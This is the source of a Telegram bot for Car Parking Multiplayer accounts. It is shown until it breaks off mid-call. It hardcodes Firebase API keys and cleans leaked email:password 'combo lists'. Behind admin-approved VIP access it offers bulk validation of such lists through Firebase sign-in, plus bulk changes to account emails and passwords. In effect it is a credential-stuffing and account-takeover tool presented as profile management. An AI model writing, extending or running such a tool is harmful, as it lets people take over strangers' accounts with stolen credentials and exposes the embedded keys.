#!/usr/bin/env python3
"""
MRX CPM 1 & 2 Manager (English Only + JSON Storage)
- No MongoDB (uses JSON files in ./data/)
- No Telegram Stars payment (Free for approved users)
- Auto VIP request to admin on /start
- Full English UI
- No custom emojis (plain unicode emojis only)
"""

import os
import time
import logging
import asyncio
import random
import string
import re
import json
import aiohttp
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, BotCommandScopeChat
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ConversationHandler, ContextTypes, filters
)

# ==================== CONFIGURATION ====================
			BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
OWNER_ID = int(os.getenv("ADMIN_ID", "612673014"))

CPM_KEYS = {
    "cpm1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
    "cpm2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}
FIREBASE_URL = "https://identitytoolkit.googleapis.com/v1"

BRAND_NAME = "MRX CPM MANAGER"

# ==================== LOGGING ====================
logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== JSON STORAGE (Replaces MongoDB) ====================
DATA_DIR = Path("data")
DATA_DIR.mkdir(exist_ok=True)

class JsonStore:
    def __init__(self, name, default):
        self.path = DATA_DIR / f"{name}.json"
        self._default = default
        self._lock = threading.Lock()
        if self.path.exists():
            try:
                with open(self.path, "r", encoding="utf-8") as f:
                    self.data = json.load(f)
            except Exception as e:
                logger.error(f"Load error {name}: {e}")
                self.data = json.loads(json.dumps(default))
        else:
            self.data = json.loads(json.dumps(default))
            self.save()

    def save(self):
        with self._lock:
            try:
                with open(self.path, "w", encoding="utf-8") as f:
                    json.dump(self.data, f, ensure_ascii=False, indent=2)
            except Exception as e:
                logger.error(f"Save error {self.path}: {e}")

users_store    = JsonStore("users", {})
settings_store = JsonStore("settings", {})
blocked_store  = JsonStore("blocked", [])
logs_store     = JsonStore("logs", [])

# ==================== USER / PERMISSION HELPERS ====================
def get_user(uid):
    return users_store.data.get(str(uid))

def save_user(uid, data):
    users_store.data[str(uid)] = data
    users_store.save()

def get_all_users():
    return list(users_store.data.values())

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    u = get_user(user_id)
    return bool(u and u.get("role") == "admin")

def is_vip(user_id):
    if is_admin(user_id):
        return True
    u = get_user(user_id)
    if not u or u.get("status") != "approved":
        return False
    expiry = u.get("expiry")
    if expiry and time.time() > expiry:
        return False
    return True

def get_all_admins():
    admins = [OWNER_ID]
    for u in users_store.data.values():
        if u.get("role") == "admin":
            uid = u.get("_id")
            if uid and uid not in admins:
                admins.append(uid)
    return admins

def is_global_lock():
    return bool(settings_store.data.get("global_lock", False))

def set_global_lock(state: bool):
    settings_store.data["global_lock"] = state
    settings_store.save()

def is_blocked(user_id):
    return str(user_id) in blocked_store.data

def block_user(user_id):
    if str(user_id) not in blocked_store.data:
        blocked_store.data.append(str(user_id))
        blocked_store.save()

def unblock_user(user_id):
    if str(user_id) in blocked_store.data:
        blocked_store.data.remove(str(user_id))
        blocked_store.save()

def log_action(user_id, action, details=""):
    logs_store.data.append({
        "user_id": user_id,
        "action": action,
        "details": details,
        "timestamp": datetime.utcnow().isoformat()
    })
    if len(logs_store.data) > 5000:
        logs_store.data = logs_store.data[-5000:]
    logs_store.save()

def track_and_get_user(user):
    uid = user.id
    key = str(uid)
    existing = users_store.data.get(key)
    now_iso = datetime.utcnow().isoformat()

    if not existing:
        is_owner = (uid == OWNER_ID)
        existing = {
            "_id": uid,
            "username": user.username or "",
            "first_name": user.first_name or "",
            "joined": now_iso,
            "status": "approved" if is_owner else "pending",
            "role": "owner" if is_owner else "user",
            "expiry": None,
            "last_seen": now_iso,
            "last_request": 0
        }
        users_store.data[key] = existing
        users_store.save()
        return existing

    if existing.get("status") == "approved" and existing.get("expiry"):
        if time.time() > existing["expiry"]:
            existing["status"] = "expired"
    existing["last_seen"] = now_iso
    existing["username"] = user.username or ""
    existing["first_name"] = user.first_name or ""
    users_store.data[key] = existing
    users_store.save()
    return existing

def mark_request_sent(uid):
    key = str(uid)
    if key in users_store.data:
        users_store.data[key]["last_request"] = time.time()
        users_store.save()

def should_send_request(db_user, cooldown=300):
    last = db_user.get("last_request", 0) or 0
    return (time.time() - last) > cooldown

# ==================== AUTO UPTIME ENGINE ====================
class DummyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>System is Operational</h1><p>MRX CPM Terminal Running.</p>")
    def log_message(self, format, *args): return

def start_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), DummyHandler)
    server.serve_forever()

def self_pinger():
    url = os.environ.get("RENDER_EXTERNAL_URL", f"http://localhost:{os.environ.get('PORT', 8080)}")
    while True:
        time.sleep(600)
        try:
            urllib.request.urlopen(url, timeout=10)
        except Exception:
            pass

def keep_alive():
    threading.Thread(target=start_dummy_server, daemon=True).start()
    threading.Thread(target=self_pinger, daemon=True).start()

# ==================== CONVERSATION STATES ====================
(
    AWAIT_EMAIL_LOGIN, AWAIT_PASSWORD_LOGIN,
    AWAIT_NEW_EMAIL, AWAIT_NEW_PASSWORD, AWAIT_CONFIRM_PASSWORD,
    AWAIT_BROADCAST, AWAIT_BLOCK_ID, AWAIT_UNBLOCK_ID,
    AWAIT_BULK_FILE, AWAIT_BULK_NEW_EMAIL, AWAIT_BULK_NEW_PASS,
    AWAIT_VALIDATOR_DATA
) = range(12)

# ==================== FIREBASE (AIOHTTP) ====================
async def firebase_request(game_version: str, endpoint: str, body: dict) -> dict:
    key = CPM_KEYS.get(game_version, CPM_KEYS["cpm2"])
    url = f"{FIREBASE_URL}/{endpoint}?key={key}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=body, headers={"Content-Type": "application/json"}, timeout=15) as r:
                data = await r.json()
                if r.status == 200 and ("idToken" in data or "users" in data):
                    return {"ok": True, "data": data}
                code = data.get("error", {}).get("message", "Unknown error")
                return {"ok": False, "error": f"❌ {code}"}
    except Exception:
        return {"ok": False, "error": "❌ Network error/Timeout"}

async def cpm_login(game_version, email, password):
    return await firebase_request(game_version, "accounts:signInWithPassword",
                                  {"email": email, "password": password, "returnSecureToken": True})

async def cpm_change_email(game_version, id_token, new_email):
    return await firebase_request(game_version, "accounts:update",
                                  {"idToken": id_token, "email": new_email, "returnSecureToken": True})

async def cpm_change_password(game_version, id_token, new_password):
    return await firebase_request(game_version, "accounts:update",
                                  {"idToken": id_token, "password": new_password, "returnSecureToken": True})

def generate_random_email():
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{random_str}@gmail.com"

# ==================== KEYBOARDS (English Only, No Custom Emojis) ====================
def request_access_kb():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton(text="🔓 Request VIP Access", callback_data="req_access")
    ]])

def admin_approve_kb(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="✅ 1 Day", callback_data=f"apprv_1d_{user_id}"),
         InlineKeyboardButton(text="✅ 7 Days", callback_data=f"apprv_7d_{user_id}")],
        [InlineKeyboardButton(text="♾️ Lifetime", callback_data=f"apprv_life_{user_id}")],
        [InlineKeyboardButton(text="❌ Reject", callback_data=f"reject_{user_id}")]
    ])

def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🎮 CPM 1 Login", callback_data="sel_cpm1"),
         InlineKeyboardButton(text="🎮 CPM 2 Login", callback_data="sel_cpm2")],
        [InlineKeyboardButton(text="📦 Bulk Updater", callback_data="ask_upd"),
         InlineKeyboardButton(text="🔍 Bulk Validator", callback_data="ask_val")],
        [InlineKeyboardButton(text="ℹ️ System Info", callback_data="about"),
         InlineKeyboardButton(text="🆘 Support", callback_data="help")]
    ])

def ask_version_kb(action_prefix):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="CPM 1", callback_data=f"{action_prefix}_cpm1"),
         InlineKeyboardButton(text="CPM 2", callback_data=f"{action_prefix}_cpm2")],
        [InlineKeyboardButton(text="⬅️ Back to Terminal", callback_data="menu")]
    ])

def logged_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="👤 View Profile", callback_data="info")],
        [InlineKeyboardButton(text="📧 Update Email", callback_data="change_email"),
         InlineKeyboardButton(text="🔒 Update Password", callback_data="change_pass")],
        [InlineKeyboardButton(text="🚪 Disconnect (Logout)", callback_data="logout")]
    ])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton(text="⬅️ Back to Terminal", callback_data="menu")]])

def cancel_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton(text="❌ Abort Operation", callback_data="menu")]])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="📊 View Stats", callback_data="adm_stats"),
         InlineKeyboardButton(text="👥 Users List", callback_data="adm_users")],
        [InlineKeyboardButton(text="📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton(text="🚫 Block ID", callback_data="adm_block"),
         InlineKeyboardButton(text="✅ Unblock ID", callback_data="adm_unblock")],
        [InlineKeyboardButton(text="❌ Close Panel", callback_data="close_menu")]
    ])

# ==================== COMMAND SCOPES ====================
PUBLIC_CMDS = [
    BotCommand("start", "Boot Terminal"),
    BotCommand("format", "Clean Combo List"),
    BotCommand("profile", "Active Session")
]
ADMIN_CMDS = PUBLIC_CMDS + [
    BotCommand("admin", "Admin Panel"),
    BotCommand("lock", "Lock"), BotCommand("unlock", "Unlock"),
    BotCommand("find", "Find"), BotCommand("revoke", "Revoke"),
    BotCommand("addadmin", "Add Admin"), BotCommand("remadmin", "Rem Admin"),
    BotCommand("logs", "View User Logs")
]

async def setup_commands(application: Application):
    await application.bot.set_my_commands(PUBLIC_CMDS)
    for adm in get_all_admins():
        try:
            await application.bot.set_my_commands(ADMIN_CMDS, scope=BotCommandScopeChat(adm))
        except Exception:
            pass

async def update_admin_menu(bot, user_id, make_admin=True):
    try:
        cmds = ADMIN_CMDS if make_admin else PUBLIC_CMDS
        await bot.set_my_commands(cmds, scope=BotCommandScopeChat(user_id))
    except Exception:
        pass

# ==================== VIP REQUEST HELPER ====================
async def send_vip_request(bot, user):
    username = f"@{user.username}" if user.username else (user.first_name or "Unknown")
    req_text = (
        f"🔔 <b>NEW VIP REQUEST</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: {username}\n"
        f"🆔 ID: <code>{user.id}</code>\n\n"
        f"Select approval duration:"
    )
    for adm in get_all_admins():
        try:
            await bot.send_message(adm, req_text, parse_mode=ParseMode.HTML,
                                   reply_markup=admin_approve_kb(user.id))
        except Exception as e:
            logger.error(f"Failed to send VIP request to {adm}: {e}")

# ==================== /start ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_blocked(user.id):
        return ConversationHandler.END

    db_user = track_and_get_user(user)

    if is_admin(user.id):
        await update.message.reply_text(
            f"💠 <b>{BRAND_NAME}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Welcome back, <b>{user.first_name}</b>.\n\n"
            f"<blockquote>Manage your Car Parking Multiplayer profiles securely.</blockquote>",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
        )
        return ConversationHandler.END

    if db_user.get("status") != "approved":
        if should_send_request(db_user):
            await send_vip_request(context.bot, user)
            mark_request_sent(user.id)

        await update.message.reply_text(
            f"🔒 <b>TERMINAL LOCKED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Welcome, <b>{user.first_name}</b>.\n\n"
            f"<blockquote>Your VIP access request has been sent to the administrator. "
            f"Please wait for approval. You will be notified once approved.</blockquote>\n\n"
            f"Click the button below if you want to re-send the request.",
            parse_mode=ParseMode.HTML,
            reply_markup=request_access_kb()
        )
        return ConversationHandler.END

    await update.message.reply_text(
        f"💠 <b>{BRAND_NAME}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Welcome to the terminal, <b>{user.first_name}</b>.\n\n"
        f"<blockquote>Manage your Car Parking Multiplayer profiles securely.</blockquote>",
        parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
    )
    return ConversationHandler.END

# ==================== /format ====================
async def format_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.replace("/format", "").strip()
    if not text and not update.message.reply_to_message:
        await update.message.reply_text(
            f"🛠️ <b>Format Tool</b>\n"
            f"Send <code>/format &lt;text&gt;</code> or reply to a messy combo list.",
            parse_mode=ParseMode.HTML
        )
        return
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text or ""

    formatted = []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        parts = re.split(r'[:|;,\s]+', line)
        email, pwd = None, None
        for i, p in enumerate(parts):
            if "@" in p and "." in p:
                email = p
                if i + 1 < len(parts):
                    pwd = parts[i + 1]
                break
        if email and pwd:
            formatted.append(f"{email}:{pwd}")

    if not formatted:
        await update.message.reply_text(
            f"❌ Could not extract any valid Email:Password combinations.",
            parse_mode=ParseMode.HTML
        )
        return

    out = "\n".join(formatted)
    if len(out) > 4000:
        filename = f"Formatted_{datetime.now().strftime('%H%M%S')}.txt"
        with open(filename, "w") as f:
            f.write(out)
        await update.message.reply_document(open(filename, "rb"),
            caption=f"✅ <b>List Formatted Successfully!</b>",
            parse_mode=ParseMode.HTML)
        os.remove(filename)
    else:
        await update.message.reply_text(
            f"🛠️ <b>Formatted List:</b>\n\n<code>{out}</code>",
            parse_mode=ParseMode.HTML
        )

# ==================== /profile ====================
async def profile_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_blocked(user_id):
        return
    if user_id in sessions:
        info = (
            f"👤 <b>PROFILE OVERVIEW</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 <b>Game:</b> <code>{sessions[user_id]['game'].upper()}</code>\n"
            f"📧 <b>Registered Email:</b>\n<blockquote><code>{sessions[user_id]['email']}</code></blockquote>\n"
            f"ℹ️ <b>Database Sync:</b> ✅ <i>Connected</i>\n━━━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(info, parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb())
    else:
        await update.message.reply_text(
            "You do not have an active session. Please /start to login.",
            parse_mode=ParseMode.HTML
        )

# ==================== ADMIN COMMANDS ====================
async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    await update.message.reply_text(
        f"👑 <b>ADMINISTRATOR PANEL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Welcome to the control room. ✅\n\n"
        f"<blockquote>Access granted to Database.\nAll security protocols are currently active.</blockquote>\n\n"
        f"<i>Select a management module below:</i>",
        parse_mode=ParseMode.HTML, reply_markup=admin_kb()
    )

async def lock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    set_global_lock(True)
    await update.message.reply_text(
        f"🔒 <b>GLOBAL LOCK ACTIVATED.</b>\nBot is now Private (VIP/Admins Only).",
        parse_mode=ParseMode.HTML
    )

async def unlock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    set_global_lock(False)
    await update.message.reply_text(
        f"✅ <b>GLOBAL LOCK DEACTIVATED.</b>\nBot is now Public.",
        parse_mode=ParseMode.HTML
    )

async def revoke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    try:
        target_id = int(context.args[0])
        u = get_user(target_id)
        if u:
            u["status"] = "revoked"
            u["expiry"] = None
            save_user(target_id, u)
        await update.message.reply_text(
            f"🚫 VIP access revoked for ID: <code>{target_id}</code>",
            parse_mode=ParseMode.HTML
        )
    except Exception:
        await update.message.reply_text(
            f"❌ Usage: <code>/revoke [user_id]</code>",
            parse_mode=ParseMode.HTML
        )

async def find_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    try:
        query = context.args[0]
        user_data = None
        if query.isdigit():
            user_data = get_user(int(query))
        else:
            q = query.replace("@", "").lower()
            for u in get_all_users():
                if (u.get("username") or "").lower() == q:
                    user_data = u
                    break

        if user_data:
            stat = user_data.get('status', 'N/A')
            role = user_data.get('role', 'user')
            if stat == "approved" and user_data.get('expiry'):
                days_left = round((user_data['expiry'] - time.time()) / 86400, 1)
                stat += f" ({days_left} days left)"
            info = (
                f"🔍 <b>USER RECORD FOUND</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 <b>ID:</b> <code>{user_data['_id']}</code>\n"
                f"👤 <b>Alias:</b> @{user_data.get('username', 'N/A')}\n"
                f"👑 <b>Role:</b> {role.upper()}\n"
                f"✅ <b>Status:</b> {stat.upper()}\n"
                f"📅 <b>Joined:</b> {user_data.get('joined', '').split('T')[0]}"
            )
            await update.message.reply_text(info, parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(
                f"❌ Usage: <code>/find [user_id or @username]</code>",
                parse_mode=ParseMode.HTML
            )
    except Exception:
        await update.message.reply_text(
            f"❌ Usage: <code>/find [user_id or @username]</code>",
            parse_mode=ParseMode.HTML
        )

async def addadmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text(
            f"❌ Only the Main Owner can promote/demote admins.",
            parse_mode=ParseMode.HTML
        )
        return
    try:
        target_id = int(context.args[0])
        u = get_user(target_id) or {"_id": target_id, "username": "", "first_name": "",
                                     "joined": datetime.utcnow().isoformat(),
                                     "expiry": None, "last_seen": "", "last_request": 0}
        u["role"] = "admin"
        u["status"] = "approved"
        u["expiry"] = None
        save_user(target_id, u)

        await update_admin_menu(context.bot, target_id, make_admin=True)
        msg = f"👑 ID <code>{target_id}</code> is now an Administrator."
        await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
        try:
            await context.bot.send_message(target_id, msg, parse_mode=ParseMode.HTML)
        except Exception:
            pass
    except Exception:
        await update.message.reply_text(
            f"❌ Usage: <code>/addadmin [user_id]</code>",
            parse_mode=ParseMode.HTML
        )

async def remadmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text(
            f"❌ Only the Main Owner can promote/demote admins.",
            parse_mode=ParseMode.HTML
        )
        return
    try:
        target_id = int(context.args[0])
        u = get_user(target_id)
        if u:
            u["role"] = "user"
            save_user(target_id, u)
        await update_admin_menu(context.bot, target_id, make_admin=False)
        await update.message.reply_text(
            f"❌ ID <code>{target_id}</code> is no longer an Administrator.",
            parse_mode=ParseMode.HTML
        )
    except Exception:
        await update.message.reply_text(
            f"❌ Usage: <code>/remadmin [user_id]</code>",
            parse_mode=ParseMode.HTML
        )

async def logs_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    try:
        target_id = int(context.args[0])
        user_logs = [l for l in logs_store.data if l.get("user_id") == target_id][-15:][::-1]
        if not user_logs:
            await update.message.reply_text(
                f"❌ No logs found for ID: <code>{target_id}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        text = f"📊 <b>USER LOGS: <code>{target_id}</code></b>\n━━━━━━━━━━━━━━━━━━━━\n"
        for log in user_logs:
            dt = log['timestamp'].split('T')[0] + " " + log['timestamp'].split('T')[1][:5]
            text += f"📅 <b>{dt}</b>\n⚙️ Action: <code>{log['action']}</code>\n"
            if log.get('details'):
                text += f"📝 Details: {log['details']}\n"
            text += "━━━━━━━━━━━━━━━━━━━━\n"

        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    except Exception:
        await update.message.reply_text(
            f"❌ Usage: <code>/logs [user_id]</code>",
            parse_mode=ParseMode.HTML
        )

# ==================== MENU CALLBACK ====================
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    user_id = user.id
    if is_blocked(user_id):
        return ConversationHandler.END

    action = query.data
    db_user = track_and_get_user(user)

    # VIP Request button
    if action == "req_access":
        await send_vip_request(context.bot, user)
        mark_request_sent(user_id)
        await query.answer("Request sent to admin!", show_alert=True)
        await query.edit_message_text(
            "Request Sent!\nPlease wait for an Administrator to approve your account.",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END

    # Approve / Reject buttons
    if action.startswith("apprv_") or action.startswith("reject_"):
        if not is_admin(user_id):
            return ConversationHandler.END
        parts = action.split("_")
        target_id = int(parts[-1])
        if action.startswith("reject"):
            tgt = get_user(target_id)
            if tgt:
                tgt["status"] = "rejected"
                save_user(target_id, tgt)
            await query.edit_message_text(
                f"❌ User <code>{target_id}</code> rejected.",
                parse_mode=ParseMode.HTML
            )
            try:
                await context.bot.send_message(target_id,
                    f"❌ Your VIP request was rejected.",
                    parse_mode=ParseMode.HTML)
            except Exception:
                pass
        else:
            duration = parts[1]
            expiry = None
            if duration == "1d":
                expiry = time.time() + 86400
            elif duration == "7d":
                expiry = time.time() + (7 * 86400)
            tgt = get_user(target_id) or {"_id": target_id, "username": "", "first_name": "",
                                            "joined": datetime.utcnow().isoformat(),
                                            "role": "user", "last_seen": "", "last_request": 0}
            tgt["status"] = "approved"
            tgt["expiry"] = expiry
            save_user(target_id, tgt)
            dur_text = "Lifetime" if not expiry else ("1 Day" if duration == "1d" else "7 Days")
            await query.edit_message_text(
                f"✅ User <code>{target_id}</code> approved for {dur_text}.",
                parse_mode=ParseMode.HTML
            )
            try:
                await context.bot.send_message(target_id,
                    f"✅ <b>VIP ACCESS GRANTED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"Your account has been approved ({dur_text}).\n"
                    f"Type /start to begin.",
                    parse_mode=ParseMode.HTML)
            except Exception:
                pass
        return ConversationHandler.END

    # Global lock check for non-admins
    if is_global_lock() and not is_admin(user_id):
        if db_user.get("status") != "approved":
            await query.edit_message_text(
                f"🔒 <b>TERMINAL LOCKED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"<blockquote>This terminal is in Private Mode. "
                f"Only VIP members and Administrators can access the tools.</blockquote>",
                parse_mode=ParseMode.HTML,
                reply_markup=request_access_kb()
            )
            return ConversationHandler.END

    if action == "close_menu":
        await query.delete_message()
        return ConversationHandler.END

    if action == "about":
        await query.edit_message_text(
            f"ℹ️ <b>SYSTEM INFORMATION</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"<blockquote><b>Bot Name:</b> {BRAND_NAME}\n"
            f"<b>Supported:</b> CPM 1 & CPM 2\n"
            f"<b>Features:</b> Smart Bulk Injection, Validation</blockquote>\n\n"
            f"🔐 <b>Security Protocol:</b>\n"
            f"API bridging ensures absolute account safety.\n\n"
            f"👨‍💻 <b>Developer:</b> <code>@Pro_mr_x</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML, reply_markup=back_kb()
        )
        return ConversationHandler.END

    if action == "help":
        await query.edit_message_text(
            f"🆘 <b>COMMAND CENTER & HELP</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Menu Commands:</b>\n"
            f"• /start — Reboot terminal\n"
            f"• /format — Clean combo lists\n\n"
            f"<b>Support:</b>\n"
            f"<blockquote>For VIP access or business inquiries, contact an Administrator.</blockquote>\n"
            f"━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML, reply_markup=back_kb()
        )
        return ConversationHandler.END

    if action == "menu":
        if user_id in sessions:
            text = (
                f"✅ <b>AUTHENTICATION SUCCESSFUL</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🎮 <b>Game:</b> {sessions[user_id]['game'].upper()}\n"
                f"📧 <b>Registered Email:</b>\n"
                f"<blockquote><code>{sessions[user_id]['email']}</code></blockquote>\n\n"
                f"<i>Select an action from the dashboard:</i>"
            )
            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb())
        else:
            await query.edit_message_text(
                f"💠 <b>{BRAND_NAME}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Welcome to the terminal, <b>{user.first_name}</b>.\n\n"
                f"<blockquote>Manage your Car Parking Multiplayer profiles securely.</blockquote>",
                parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
            )
        return ConversationHandler.END

    if action == "ask_upd":
        await query.edit_message_text(
            f"📦 <b>BULK UPDATER SELECTION</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Select the game version:",
            parse_mode=ParseMode.HTML, reply_markup=ask_version_kb("bulk_upd")
        )
        return ConversationHandler.END

    if action == "ask_val":
        await query.edit_message_text(
            f"🔍 <b>BULK VALIDATOR SELECTION</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Select the game version:",
            parse_mode=ParseMode.HTML, reply_markup=ask_version_kb("bulk_val")
        )
        return ConversationHandler.END

    # ==================== BULK ACTIONS (FREE - No Stars) ====================
    if action in ["bulk_upd_cpm1", "bulk_upd_cpm2", "bulk_val_cpm1", "bulk_val_cpm2"]:
        if not is_vip(user_id):
            await query.edit_message_text(
                f"🔒 <b>ACCESS DENIED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"You need VIP access to use this feature.\n"
                f"Please wait for admin approval or contact support.",
                parse_mode=ParseMode.HTML, reply_markup=back_kb()
            )
            return ConversationHandler.END

        game_ver = "cpm1" if "cpm1" in action else "cpm2"
        context.user_data["game_version"] = game_ver

        if "bulk_upd" in action:
            text = (
                f"📦 <b>BULK UPDATER ({game_ver.upper()})</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🛠️ <b>Step 1: Upload Account List</b>\n"
                f"Format required: <code>Email : Password</code>\n\n"
                f"⬇️ <b>Upload / Paste below:</b>"
            )
            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb())
            return AWAIT_BULK_FILE
        else:
            text = (
                f"🔍 <b>BULK VALIDATOR ({game_ver.upper()})</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🛠️ <b>Format:</b> <code>Email : Password</code>\n\n"
                f"⬇️ <b>Upload / Paste below:</b>"
            )
            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb())
            return AWAIT_VALIDATOR_DATA

    if action in ["sel_cpm1", "sel_cpm2"]:
        game_ver = "cpm1" if action == "sel_cpm1" else "cpm2"
        context.user_data["game_version"] = game_ver
        text = (
            f"🔐 <b>LOGIN PORTAL ({game_ver.upper()})</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📧 <b>Provide your registered email address:</b>"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb())
        return AWAIT_EMAIL_LOGIN

    if action == "info":
        if user_id not in sessions:
            return ConversationHandler.END
        info = (
            f"👤 <b>PROFILE OVERVIEW</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 <b>Game:</b> <code>{sessions[user_id]['game'].upper()}</code>\n"
            f"📧 <b>Registered Email:</b>\n<blockquote><code>{sessions[user_id]['email']}</code></blockquote>\n"
            f"ℹ️ <b>Database Sync:</b> ✅ <i>Connected</i>\n━━━━━━━━━━━━━━━━━━━━"
        )
        await query.edit_message_text(info, parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb())
        return ConversationHandler.END

    if action == "change_email":
        if user_id not in sessions:
            return ConversationHandler.END
        await query.edit_message_text(
            f"📧 UPDATE EMAIL\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Provide new target email address.\n"
            f"<i>(Type RANDOM for @gmail.com)</i>",
            parse_mode=ParseMode.HTML, reply_markup=cancel_kb()
        )
        return AWAIT_NEW_EMAIL

    if action == "change_pass":
        if user_id not in sessions:
            return ConversationHandler.END
        await query.edit_message_text(
            f"🔒 UPDATE PASSWORD\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Provide new password (min. 6 chars):",
            parse_mode=ParseMode.HTML, reply_markup=cancel_kb()
        )
        return AWAIT_NEW_PASSWORD

    if action == "logout":
        sessions.pop(user_id, None)
        await query.edit_message_text(
            f"🚪 SESSION TERMINATED\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Your session was securely closed. Use /start to login again.",
            parse_mode=ParseMode.HTML, reply_markup=back_kb()
        )
        return ConversationHandler.END

    if action.startswith("adm_"):
        if not is_admin(user_id):
            return ConversationHandler.END

        if action == "adm_stats":
            all_u = get_all_users()
            users_count = len(all_u)
            approved = sum(1 for u in all_u if u.get("status") == "approved")
            pending = sum(1 for u in all_u if u.get("status") == "pending")
            text = (
                f"📊 <b>DATABASE STATISTICS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"👥 <b>Total Users:</b> {users_count}\n"
                f"✅ <b>VIP Approved:</b> {approved}\n"
                f"⏳ <b>Pending:</b> {pending}\n"
                f"🟢 <b>Active Logins:</b> {len(sessions)}"
            )
            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=admin_kb())
            return ConversationHandler.END

        elif action == "adm_users":
            await query.edit_message_text(
                f"⏳ <i>Extracting user database...</i>",
                parse_mode=ParseMode.HTML
            )
            all_users = get_all_users()
            if not all_users:
                await query.edit_message_text("No users found in database.",
